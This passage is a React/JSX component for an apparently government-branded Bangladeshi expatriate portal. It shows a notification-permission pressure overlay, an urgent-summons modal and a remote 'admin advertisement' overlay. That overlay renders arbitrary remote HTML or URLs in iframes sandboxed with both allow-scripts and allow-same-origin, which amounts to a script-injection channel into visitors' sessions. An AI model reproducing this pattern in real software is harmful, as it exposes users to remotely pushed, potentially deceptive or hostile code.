            </div>
            <p className="text-sm opacity-60 leading-relaxed">
              প্রবাসী কল্যাণ ভবন, ৭১-৭২ ইস্কাটন গার্ডেন রোড, রমনা, ঢাকা-১০০০। <br />
              ইমেইল: info@probashi.gov.bd <br />
              হেল্পলাইন: ৩৩৩ অথবা ১৬১৩৫
            </p>
          </div>
          <div>
            <h5 className="font-bold mb-6 text-sm uppercase tracking-widest">গুরুত্বপূর্ণ লিঙ্ক</h5>
            <ul className="space-y-3 text-sm opacity-60">
              <li className="hover:text-gov-green cursor-pointer">প্রধানমন্ত্রীর কার্যালয়</li>
              <li className="hover:text-gov-green cursor-pointer">জনশক্তি কর্মসংস্থান ও প্রশিক্ষণ ব্যুরো</li>
              <li className="hover:text-gov-green cursor-pointer">ওয়েজ আর্নার্স কল্যাণ বোর্ড</li>
              <li className="hover:text-gov-green cursor-pointer">বোয়েসেল</li>
            </ul>
          </div>
          <div>
            <h5 className="font-bold mb-6 text-sm uppercase tracking-widest">পরিকল্পনা ও বাস্তবায়নে</h5>
            <div className="space-y-4">
              <p className="text-xs opacity-60">এটুআই (a2i), তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ</p>
              <div className="flex gap-4">
                <div className="w-10 h-10 bg-white/10 rounded-lg"></div>
                <div className="w-10 h-10 bg-white/10 rounded-lg"></div>
              </div>
            </div>
          </div>
        </div>
        <div className="max-w-6xl mx-auto px-4 mt-12 pt-8 border-t border-white/10 text-center text-[10px] opacity-40 uppercase tracking-[0.3em]">
          &copy; ২০২৬ গণপ্রজাতন্ত্রী বাংলাদেশ সরকার | সর্বস্বত্ব সংরক্ষিত
        </div>
      </footer>

      <footer className="text-center mt-12 px-4">
        <p className="text-[10px] text-slate-400 font-black uppercase tracking-widest">
          Government Digital Service Portal &copy; 2026
        </p>
      </footer>
    </div>
    );
  };

  return (
    <div className="relative">
      {renderContent()}
      <BottomNav activePage={activePage} setActivePage={setActivePage} />
      <AnimatePresence>{showAdmin && <AdminPanel onClose={() => setShowAdmin(false)} sendEmailNotification={sendEmailNotification} />}</AnimatePresence>
      <AnimatePresence>{showContact && <ContactModal onClose={() => setShowContact(false)} setToast={setToast} />}</AnimatePresence>
      <AnimatePresence>{showUrgentSummons && targetUser && <UrgentSummonsModal user={targetUser} onClose={() => setShowUrgentSummons(false)} />}</AnimatePresence>
      <AnimatePresence>{toast && <Toast message={toast.message} type={toast.type} onClose={() => setToast(null)} />}</AnimatePresence>

      {/* Official Government Slate Styled Push Notification Permission Invitation Banner */}
      <AnimatePresence>
        {showPushBanner && (
          <motion.div 
            initial={{ y: 100, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            exit={{ y: 100, opacity: 0 }}
            transition={{ type: 'spring', stiffness: 260, damping: 20 }}
            className="fixed bottom-[72px] md:bottom-6 left-1/2 -translate-x-1/2 max-w-xl w-[92vw] bg-slate-900 border-2 border-emerald-500 text-white p-4 rounded-2xl md:rounded-3xl shadow-2xl z-[99999] flex flex-col md:flex-row items-center gap-4 border-b-4 border-emerald-600"
          >
            <div className="flex-1 text-center md:text-left">
              <div className="flex items-center gap-2 mb-1 justify-center md:justify-start">
                <span className="w-2.5 h-2.5 bg-emerald-500 rounded-full animate-ping shrink-0" />
                <span className="font-extrabold text-amber-400 text-[11px] md:text-xs tracking-wider uppercase flex items-center gap-1 select-none">
                  🔔 সরকারি ডিজিটাল জরুরী বিজ্ঞপ্তি সেবা
                </span>
              </div>
              <p className="text-[10px] md:text-xs font-bold leading-relaxed text-slate-200">
                পেজ বন্ধ থাকলেও নোটিফিকেশন বারে সরাসরি জরুরী নির্দেশ বা নতুন বিজ্ঞাপন পেতে ব্রাউজার নোটিফিকেশন সচল করুন।
              </p>
            </div>
            <div className="flex gap-1.5 items-center w-full md:w-auto shrink-0 justify-center">
              <button 
                onClick={() => setShowPushBanner(false)}
                className="px-3.5 py-2 text-[11px] font-extrabold text-slate-400 hover:text-white transition-all cursor-pointer active:scale-95"
              >
                পরে করব
              </button>
              <button 
                onClick={registerAndSubscribePush}
                className="px-4.5 py-2 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 rounded-xl font-extrabold text-[11px] shadow-lg transition-all active:scale-95 cursor-pointer"
              >
                অনুমতি দিন
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Force Push Re-Prompt administrative overlay */}
      <AnimatePresence>
        {showForcePushModal && (
          <div className="fixed inset-0 bg-slate-950/95 backdrop-blur-md z-[999999] flex items-center justify-center p-4 overflow-y-auto">
            <motion.div 
              initial={{ scale: 0.9, y: 20, opacity: 0 }}
              animate={{ 
                scale: 1, 
                y: 0, 
                opacity: 1,
                x: permissionState === 'denied' ? [0, -4, 4, -4, 4, 0] : 0
              }}
              exit={{ scale: 0.9, y: 20, opacity: 0 }}
              transition={{ 
                type: 'spring', 
                stiffness: 260, 
                damping: 20,
                x: { duration: 0.5, ease: 'easeInOut' }
              }}
              className="max-w-md w-full bg-slate-900 border-2 border-amber-500 rounded-3xl p-6 shadow-2xl relative overflow-hidden border-b-6 border-amber-600"
            >
              <div className="flex flex-col items-center text-center mb-6">
                <div className="w-16 h-16 bg-emerald-700/85 rounded-full flex items-center justify-center mb-3 shadow-inner border-2 border-emerald-500 relative">
                  <div className="w-10 h-10 bg-red-600 rounded-full flex items-center justify-center font-extrabold text-white text-[10px] select-none shadow">
                    বাংলাদেশ
                  </div>
                </div>
                <h2 className="text-sm font-black text-emerald-400 tracking-wider uppercase mb-1">
                  গণপ্রজাতন্ত্রী বাংলাদেশ সরকার
                </h2>
                <h3 className="text-amber-400 font-extrabold text-[11px] uppercase tracking-widest">
                  জরুরী কারিগরি নির্দেশিকা পোর্টাল
                </h3>
              </div>

              <div className="space-y-4 mb-6">
                <div className="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-4 text-center">
                  <h4 className="text-amber-500 text-xs font-black uppercase tracking-wide mb-1 flex items-center justify-center gap-1.5">
                    <span className="w-2 h-2 bg-amber-500 rounded-full animate-ping" />
                    পুশ নোটিফিকেশন বন্ধ রয়েছে
                  </h4>
                  <p className="text-[11px] leading-relaxed text-slate-300 font-bold">
                    আপনার ব্রাউজার বা ডিভাইসে পুশ নোটিফিকেশন পারমিশন নিষ্ক্রিয় থাকায় গুরুত্বপূর্ণ সরকারি নির্দেশাবলী, আবেদন অগ্রগতি ট্র্যাকিং এবং জরুরি বিজ্ঞপ্তি পৌঁছাতে পারছে না।
                  </p>
                </div>

                {/* Guide depending on permission state */}
                {permissionState === 'denied' ? (
                  <div className="bg-red-500/10 border border-red-500/20 rounded-2xl p-4">
                    <h5 className="text-red-400 text-xs font-extrabold mb-2.5 flex items-center gap-1.5 justify-center md:justify-start">
                      🛑 নোটিফিকেশন ব্লকড (Blocked) অবস্থায় রয়েছে!
                    </h5>
                    <div className="space-y-2 text-[11px] font-bold text-slate-300 leading-relaxed text-left">
                      <p className="flex items-start gap-2">
                        <span className="bg-red-500/20 text-red-400 rounded-full w-4.5 h-4.5 flex items-center justify-center shrink-0">১</span>
                        <span>আপনার ব্রাউজার অ্যাড্রেস বারের বাম পাশে অবস্থিত <b>তালা আইকন 🔒 (Lock Icon)</b> এ ক্লিক করুন।</span>
                      </p>
                      <p className="flex items-start gap-2">
                        <span className="bg-red-500/20 text-red-400 rounded-full w-4.5 h-4.5 flex items-center justify-center shrink-0">২</span>
                        <span>সেখান থেকে <b>Notification</b> অথবা <b>নোটিফিকেশন</b> অপশনটি <b>Allow (অনুমতি দিন)</b> করুন।</span>
                      </p>
                      <p className="flex items-start gap-2">
                        <span className="bg-red-500/20 text-red-400 rounded-full w-4.5 h-4.5 flex items-center justify-center shrink-0">৩</span>
                        <span>অপশনটি চালু করার পর নিচের <b>"পুনরায় লোড করুন"</b> বাটনে ক্লিক করে পেজটি রিফ্রেশ করুন।</span>
                      </p>
                    </div>
                  </div>
                ) : (
                  <div className="bg-slate-800/60 rounded-2xl p-4 border border-slate-700 text-center">
                    <p className="text-[11px] text-slate-300 font-bold leading-relaxed">
                      নিচে দেওয়া <b>"অনুমতি প্রদান করুন"</b> বোতামে ক্লিক করে ব্রাউজার থেকে নোটিফিকেশন অনুমতি পপআপ-এর নির্দেশনা অনুসরণ করুন।
                    </p>
                  </div>
                )}
              </div>

              <div className="flex flex-col gap-2.5">
                {permissionState === 'denied' ? (
                  <button
                    onClick={() => window.location.reload()}
                    className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 rounded-xl font-black text-xs shadow-lg shadow-emerald-950/30 transition-all active:scale-95 cursor-pointer flex items-center justify-center gap-2"
                  >
                    🔄 অনুমতি দিয়ে পেজ রিফ্রেশ করুন (Reload Page)
                  </button>
                ) : (
                  <button
                    onClick={registerAndSubscribePush}
                    className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 rounded-xl font-black text-xs shadow-lg shadow-emerald-950/30 transition-all active:scale-95 cursor-pointer flex items-center justify-center gap-2"
                  >
                    🔔 নোটিফিকেশন অনুমতি দিন (Enable Notification)
                  </button>
                )}
                
                <button
                  onClick={() => {
                    setShowForcePushModal(false);
                    setToast({ message: '⚠️ নোটিফিকেশন সচল করুন অন্যথায় জরুরি নির্দেশ পাবেন না!', type: 'warning' });
                  }}
                  className="w-full py-2.5 text-xs text-slate-500 hover:text-white transition-all active:scale-95 cursor-pointer font-bold select-none text-center"
                >
                  পরে সচল করব (Dismiss Notice)
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
      
      {/* Floating Global Connection ID */}
      {globalUserId && (
        <div className="fixed top-1 left-1 z-[99999] bg-slate-900/85 backdrop-blur-sm text-white px-2.5 py-1 rounded-full text-[9px] font-mono font-bold tracking-wider pointer-events-none border border-white/10 shadow flex items-center gap-1.5 opacity-70 hover:opacity-100 transition-opacity">
          <div className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse" />
          <span>PORTAL ID: {globalUserId.toUpperCase()}</span>
        </div>
      )}

      {/* Remote Admin Advertisement Dialogue overlay */}
      <AnimatePresence>
        {remoteAd && (
          <div className="fixed inset-0 bg-black/15 backdrop-blur-[1px] z-[99999] flex items-center justify-center p-4">
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className={`bg-white/80 backdrop-blur-lg rounded-3xl overflow-hidden shadow-2xl relative flex flex-col transition-all duration-300 ${
                (remoteAd.type === 'html' || remoteAd.type === 'iframe') 
                  ? 'max-w-5xl w-[95vw] h-[85vh] max-h-[85vh]' 
                  : (remoteAd.type === 'video' || remoteAd.type === 'photo')
                    ? 'max-w-md md:max-w-xl w-[95vw] h-[85vh] max-h-[85vh]'
                    : 'max-w-lg w-full'
              }`}
            >
              {/* Large Close button in upper right corner */}
              <button 
                onClick={() => setRemoteAd(null)}
                className="absolute top-3 right-3 md:top-4 md:right-4 z-50 bg-slate-900/60 hover:bg-red-600 text-white p-2 rounded-full transition-all border border-white/20 active:scale-90"
                aria-label="Close Advertisement"
              >
                <X size={26} className="stroke-[3]" />
              </button>

              {remoteAd.type === 'html' && (
                <div className="flex flex-col h-full w-full">
                  <div className="p-3 bg-white/40 border-b border-black/5 flex items-center justify-between">
                    <span className="text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center gap-1.5 pl-2 select-none">
                      <span className="w-2 h-2 bg-emerald-500 rounded-full animate-ping" />
                      রিমোট লাইভ কোড ভিউ প্রস্তুত
                    </span>
                    <span className="text-[10px] font-mono text-slate-400 mr-12 select-none">HTML Live Renderer</span>
                  </div>
                  <div className="flex-1 bg-white/20 relative">
                    <iframe 
                      id="remote-html-frame"
                      srcDoc={remoteAd.htmlContent}
                      className="w-full h-full border-0 absolute inset-0 bg-transparent"
                      sandbox="allow-scripts allow-popups allow-forms allow-same-origin"
                      title="Remote HTML Ad"
                    />
                  </div>
                  <div className="p-3 bg-white/30 border-t border-black/5 text-center">
                    <button 
                      onClick={() => setRemoteAd(null)}
                      className="px-6 py-1.5 bg-[#006a4e] hover:bg-emerald-900 border-b-4 border-emerald-950 text-white rounded-lg font-bold text-xs transition-all shadow active:scale-95 mx-auto"
                    >
                      বন্ধ করুন
                    </button>
                  </div>
                </div>
              )}

              {remoteAd.type === 'iframe' && (
                <div className="flex flex-col h-full w-full">
                  <div className="p-3 bg-white/40 border-b border-black/5 flex items-center justify-between">
                    <span className="text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center gap-1.5 pl-2 select-none">
                      <span className="w-2 h-2 bg-blue-500 rounded-full animate-ping" />
                      লাইভ সরকারি পোর্টাল ভিউ
                    </span>
                    <span className="text-[10px] font-mono text-slate-400 mr-12 select-none truncate max-w-[200px]">{remoteAd.mediaUrl}</span>
                  </div>
                  <div className="flex-1 bg-white/20 relative">
                    {remoteAd.mediaUrl ? (
                      <iframe 
                        id="remote-iframe-frame"
                        src={remoteAd.mediaUrl}
                        className="w-full h-full border-0 absolute inset-0 bg-transparent"
                        sandbox="allow-scripts allow-popups allow-forms allow-same-origin"
                        title="Remote URL Ad"
                      />
                    ) : (
                      <div className="p-12 text-center text-slate-400 absolute inset-0 flex flex-col items-center justify-center select-none">
                        <div className="text-4xl mb-2 animate-bounce">🌐</div>
                        <p className="text-xs font-semibold">ওয়েবসাইট এড্রেস লোড করা হচ্ছে...</p>
                      </div>
                    )}
                  </div>
                  <div className="p-3 bg-white/30 border-t border-black/5 text-center">
                    <button 
                      onClick={() => setRemoteAd(null)}
                      className="px-6 py-1.5 bg-[#006a4e] hover:bg-emerald-900 border-b-4 border-emerald-950 text-white rounded-lg font-bold text-xs transition-all shadow active:scale-95 mx-auto"
                    >
                      বন্ধ করুন
                    </button>
                  </div>
                </div>
              )}

              {remoteAd.type === 'text' && (
                <div className="p-6 md:p-8 flex flex-col items-center text-center bg-white/10 backdrop-blur-md">
                  <div className="w-16 h-16 bg-white/40 rounded-full flex items-center justify-center mb-4 border border-white/20 shadow-sm animate-pulse">
                    <motion.div 
                      animate={{ rotate: [0, 10, -10, 10, 0] }} 
                      transition={{ repeat: Infinity, duration: 2, ease: "easeInOut" }}
                      className="text-3xl"
                    >
                      📢
                    </motion.div>
                  </div>
                  <h3 className="font-extrabold text-emerald-950 text-lg md:text-xl mb-3">জরুরি সরকারি ঘোষণা</h3>
                  <p className="text-slate-900 text-sm md:text-base font-bold leading-relaxed mb-6 whitespace-pre-wrap">
                    {remoteAd.message}
                  </p>
                  <button 
                    onClick={() => setRemoteAd(null)}
                    className="w-full bg-[#006a4e] hover:bg-emerald-900 border-b-4 border-emerald-950 text-white py-3 rounded-xl font-bold text-sm transition-all shadow-md active:scale-95"
                  >
                    নির্দেশনাটি পেয়েছি
                  </button>
                </div>
              )}

              {remoteAd.type === 'video' && (
                <div className="flex flex-col h-full w-full">
                  <div className="p-3 bg-white/40 border-b border-black/5 flex items-center justify-between select-none shrink-0">
                    <span className="text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center gap-1.5 pl-2">
                      <span className="w-2 h-2 bg-red-600 rounded-full animate-ping" />
                      জরুরি ভিডিও ঘোষণা
                    </span>
                    <span className="text-[10px] font-mono text-slate-400 mr-12 bg-white/30 px-2 py-0.5 rounded">Live Video Player</span>
                  </div>
                  
                  <div className="flex-1 bg-black/10 relative flex items-center justify-center min-h-0 overflow-hidden">
                    {remoteAd.mediaUrl ? (
                      <video 
                        src={remoteAd.mediaUrl}
                        className="max-w-full max-h-full w-auto h-auto object-contain block mx-auto bg-transparent"
                        controls
                        autoPlay
                        loop
                        playsInline
                      />
                    ) : (
                      <div className="p-8 text-center text-slate-500">
                        <div className="text-4xl mb-2 animate-bounce">🎞️</div>
                        <p className="text-xs font-semibold">ভিডিও ফাইল লোড হচ্ছে...</p>
                      </div>
                    )}
                  </div>

                  <div className="p-4 bg-white/35 border-t border-black/5 text-center flex flex-col items-center shrink-0">
                    {remoteAd.message && (
                      <div className="max-h-[100px] overflow-y-auto mb-3 text-slate-800 text-xs md:text-sm font-bold leading-relaxed px-4 text-center w-full whitespace-pre-wrap">
                        {remoteAd.message}
                      </div>
                    )}
                    <button 
                      onClick={() => setRemoteAd(null)}
                      className="px-8 py-2 bg-[#006a4e] hover:bg-emerald-900 border-b-4 border-emerald-950 text-white rounded-lg font-bold text-xs transition-all shadow active:scale-95 animate-pulse"
                    >
                      বন্ধ করুন
                    </button>
                  </div>
                </div>
              )}

              {remoteAd.type === 'photo' && (
                <div className="flex flex-col h-full w-full">
                  <div className="p-3 bg-white/40 border-b border-black/5 flex items-center justify-between select-none shrink-0">
                    <span className="text-xs font-bold text-slate-700 uppercase tracking-wider flex items-center gap-1.5 pl-2">
                      <span className="w-2 h-2 bg-amber-500 rounded-full animate-ping" />
                      জরুরি চিত্রিত বিজ্ঞাপন
                    </span>
                    <span className="text-[10px] font-mono text-slate-400 mr-12 bg-white/30 px-2 py-0.5 rounded">Live Photo Viewer</span>
                  </div>
                  
                  <div className="flex-1 bg-black/10 relative flex items-center justify-center min-h-0 overflow-hidden">
                    {remoteAd.mediaUrl ? (
                      <img 
                        src={remoteAd.mediaUrl}
                        alt="Advertisement banner"
                        referrerPolicy="no-referrer"
                        className="max-w-full max-h-full w-auto h-auto object-contain block mx-auto bg-transparent"
                      />
                    ) : (
                      <div className="p-12 text-center text-slate-500 w-full">
                        <div className="text-4xl mb-2 animate-pulse">🖼️</div>
                        <p className="text-xs font-semibold">বিজ্ঞাপনের ছবি লোড হচ্ছে...</p>
                      </div>
                    )}
                  </div>

                  <div className="p-4 bg-white/35 border-t border-black/5 text-center flex flex-col items-center shrink-0">
                    {remoteAd.message && (
                      <div className="max-h-[100px] overflow-y-auto mb-3 text-slate-800 text-xs md:text-sm font-bold leading-relaxed px-4 text-center w-full whitespace-pre-wrap">
                        {remoteAd.message}
                      </div>
                    )}
                    <button 
                      onClick={() => setRemoteAd(null)}
                      className="px-8 py-2 bg-[#006a4e] hover:bg-emerald-900 border-b-4 border-emerald-950 text-white rounded-lg font-bold text-xs transition-all shadow active:scale-95"
                    >
                      বন্ধ করুন
                    </button>
                  </div>
                </div>
              )}
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
